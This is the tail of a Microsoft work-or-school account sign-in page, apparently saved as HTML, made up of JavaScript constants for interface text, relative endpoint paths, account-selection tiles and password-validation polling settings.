  Constants.CONTEXT = 'rQIIAeNisFLOKCkpKLbS1y_ILypJzNHLT0vLTE7VS87P1csvSs9MAbGKhLgEpAQeflvdyO6xpebnCrsK5rOrGNVw6tTPScxLycxL10ssLqi4wMjYxcRiaGBsvImJ1dfZ18nzBNOEs3K3mAT9i9I9U8KL3VJTUosSSzLz8x4x8YYWpxb55-VUhuRnp-btYlYxSEw0TzYxTdW1MDNJ1TVJMjbSTTQ1MNNNSkpJTTQ0M7UwMTI7wLIh5AKLwCsWHgNmKw4OLgEGCQYFhh8sjItYgQ63vFLMsbvxvnPjJI_vMYuO7DnFqu8XnmxslpebWxKmr19S6eKXGpEZ4mlakBphHuVWEh6Ul-5ZapGfalxkFlZsa2plOIFNaAIb0y5Of-I8bF-SWJSeWmKrapSWkpqWWJpTAhZWNU4rT1Q1TikvzkzPy8wz1DMAAA2';
  Constants.BASE_URL = '/common/reprocess?';
  Constants.LATENCY_THRESHOLD = 2000;

  Constants.CDN_IMAGE_PATH = '';
  Constants.PREFETCH_URL = "";
  Constants.IS_USE_OTHER_ACCOUNT_VISIBLE = true;
  Constants.OTHER_ACCOUNT_TEXT = "Use another account";
  Constants.MAX_USER_TILES = 5;

  Constants.PARTNER_NAME = "Sign in with your work or school account";
  Constants.DIR = 'ltr';
  Constants.METRICS_MODE = 1;  // Client metrics mode.

  if (Constants.TokenizedStringMsgs) {
    
    Constants.TokenizedStringMsgs.GENERIC_ERROR = "\u003cH1\u003eSorry, but we\u0027re having trouble signing you in\u003c/H1\u003e\u003cp\u003ePlease try again in a few minutes. If this doesn\u0027t work, you might want to contact your admin and report the following error: #~#ErrorCode#~#.\u003c/p\u003e";
    Constants.TokenizedStringMsgs.UPN_DISAMBIGUATE_MESSAGE = "It looks like {0} is used with more than one account. Which account do you want to use?";
  }

    
    Constants.FLOW_TOKEN = 'AQABAAEAAADRNYRQ3dhRSrm-4K-adpCJjD7bDocj3O9nCPC4T2vk1xWkCGeHzPrNjCx0haK5SajnQx1JZiFFVGQft80G5R36oZVxoyUl9ugQ74sRlh5jfEXQfQH6lr3jnf7ZOuXSURwCFlnWcKrB5i0pUxGXCUv7fgkhiGFRGSgOruzGn-LRW-y0RMEz5HKRlRFYFPxMGNPpJ_Kb19kK8BsY3mBCC0eLauKGupyg7kyyONvL8OFFqsCGrY-PVrUB1oPPqNth3EeyWUdDx40hy2kPG1CeIkxobQVQbvDiFBQ608LDDrcv8Fdz-PDz8yy1PkgM4HUpMPVeBMaVlmrCXr3QHoxUiFGiIAA';
    Constants.FLOW_TOKEN_COOKIE_NAME = 'ESTSWCTXFLOWTOKEN';
    Constants.LCID = "1033";
    Constants.MSA_ACCOUNT_IMG_ALT_TEXT = "Microsoft account symbol";
    Constants.AAD_ACCOUNT_IMG_ALT_TEXT = "Work or school account symbol";
    Constants.MSA_ACCOUNT_TILE_ALT_TEXT = "Microsoft account for {0}";
    Constants.AAD_ACCOUNT_TILE_ALT_TEXT = "Work or school account for {0}";
        Constants.REALM_RESOLVER_URL = "/common/userrealm";
  Constants.FORCED_SIGN_IN = false;
  Constants.MSA_AUTH_URL = '';
  Constants.IS_CXH_REQUEST = false;
  Constants.IS_ADAL_REQUEST = false;
  Constants.IS_NAME_COEXISTENCE_ACCOUNT = false;
  Constants.ADAL_UX_OVERRIDE = false;
  Constants.CANCEL_REDIRECT_URL = '';
  Constants.IS_MSA_FED_SUPPORTED = false;
  Constants.IS_MSA_PHONE_USERNAME_SUPPORTED = false;
  Constants.IS_MSA_REDIR_SUPPORTED = false;
  Constants.MSA_DOMAIN = 'live.com';
  Constants.PROMPT = '';
  Constants.CLICKFORMORE = "Click for more actions";
  Constants.CONNECTEDTOWINDOWS = "Connected to Windows";
  Constants.SIGNEDIN = "Signed in";
  Constants.CLICKTOSIGNIN = "";
  Constants.SIGNINGOUT = "Signing out...";
  Constants.USERNAME_HINT_TEXT = 'someone@example.com ';
  Constants.IS_LOGOUT_REQUEST = false;
  Constants.SHOULD_HIDE_SIGNUP = false;
  Constants.USE_DARK_TILE_LOGO = false;
  Constants.HAS_ERROR = true;
  Constants.IS_MOBILE = false;
  Constants.SIGNOUTFORGET_URL_TEMPLATE = "/uxlogout?sessionId={0}&shouldForgetUser={1}";
  Constants.IS_HOLOGRAPHIC = false;
  Constants.Header_Text_Username = 'Sign in with your work account';
  Constants.Header_Text_Password = 'Enter your password';
  Constants.Header_Text_Privacy = 'Privacy statement';
  Constants.Use_Client_Check_Msa_Flag = true;
  Constants.DisambigHelpUrl = "";
  Constants.CxhFlow = "";
  Constants.Fido20_GetAssertionUserPrompt = "Use your PIN or Windows Hello to prove you own {0}";
  Constants.isChinaDC = false;
  Constants.Locale = "en-US";
  Constants.IsB2CScenario = false;
  Constants.appRedirectUrl = '';
  Constants.msaSignupUrl = '';
  Constants.footerTermsUrl = '';
  Constants.footerPrivacyUrl = '';

  Constants.SplitterControlData = [
  {
    "name": "Work or school account",
    "login": "Created by your IT department",
    "image": "work_account.png",
    "link": 'MSLogin.SplitterControl.LoginAAD',
    "authUrl": '',
    "id": 'aad_account_tile',
    "domainHint": ''
  }, {
    "name": "Personal account",
    "login": "Created by you",
    "image": "personal_account.png",
    "link": 'MSLogin.SplitterControl.LoginMSA',
    "authUrl": '',
    "id": 'mso_account_tile',
    "domainHint": 'msa'
  }];

  
  Constants.responseMode="NotSpecified";
  
  
  

        Constants.desktopSsoConfig =
        {
              iwaEndpointUrlFormat: "",
              iwaRequestTimeoutInMs: -2147483648,
              lastUsernameTried: ""
          };

  Constants.onPremPasswordValidationConfig =
  {
    isPollingRequired: false,
    pollUrl: '/common/onpremvalidation/Poll',
    maxPolls: 20,
    maxPollsOnError: 3,
    pollingInterval: 500,
    timeout: 7 * 1000,
    flowToken: 'AQABAAEAAADRNYRQ3dhRSrm-4K-adpCJjD7bDocj3O9nCPC4T2vk1xWkCGeHzPrNjCx0haK5SajnQx1JZiFFVGQft80G5R36oZVxoyUl9ugQ74sRlh5jfEXQfQH6lr3jnf7ZOuXSURwCFlnWcKrB5i0pUxGXCUv7fgkhiGFRGSgOruzGn-LRW-y0RMEz5HKRlRFYFPxMGNPpJ_Kb19kK8BsY3mBCC0eLauKGupyg7kyyONvL8OFFqsCGrY-PVrUB1oPPqNth3EeyWUdDx40hy2kPG1CeIkxobQVQbvDiFBQ608LDDrcv8Fdz-PDz8yy1PkgM4HUpMPVeBMaVlmrCXr3QHoxUiFGiIAA'
  }

  

  if (typeof User !== "undefined") {
    // Setup cta message fields.
    User.setupCallToActionMessages();
  }

  // Other tile
  var Tiles = Tiles || {};
  Tiles.otherJSON = {
    'name': 'Use another account',
    'login': '',
    'imageAAD': 'other_glyph.png',              
    'imageMSA': 'other_glyph.png',
    'isLive': false,
    'link': 'other',
    'authUrl': '',
    'sessionID': '',
    'domainHint': 'other'
  };
</script>




    


<!-- Pull suppressed due to UI error in rendering context -->

    

</body></html>
